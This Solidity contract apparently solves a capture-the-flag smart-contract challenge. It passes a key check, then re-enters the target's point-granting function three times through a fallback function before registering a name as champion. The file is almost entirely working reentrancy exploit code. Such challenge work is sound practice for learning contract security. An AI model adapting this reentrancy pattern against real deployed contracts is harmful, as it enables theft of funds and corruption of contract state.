// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IChallengeTwo {
    function passKey(uint16 _key) external;
    function getENoughPoint(string calldata _name) external;
    function addYourName() external;
}

contract ChallengeTwoExploit {
    IChallengeTwo public targetContract;
    uint public reentrancyCount;
    string public myName = "devvmichael";

    constructor(address _targetAddress) {
        targetContract = IChallengeTwo(_targetAddress);
    }

    function exploit(uint16 _key) external {
        // Step 1: Pass the initial key check
        targetContract.passKey(_key);

        // Step 2: Begin reentrancy to accumulate points
        targetContract.getENoughPoint(myName);
    }

    // Fallback function to enable reentrancy
    fallback() external payable {
        if (reentrancyCount < 3) { // Re-enter until points reach 4
            reentrancyCount++;
            targetContract.getENoughPoint(myName);
        } else {
            // Step 3: Finalize by adding the name to champions
            targetContract.addYourName();
        }
    }
}
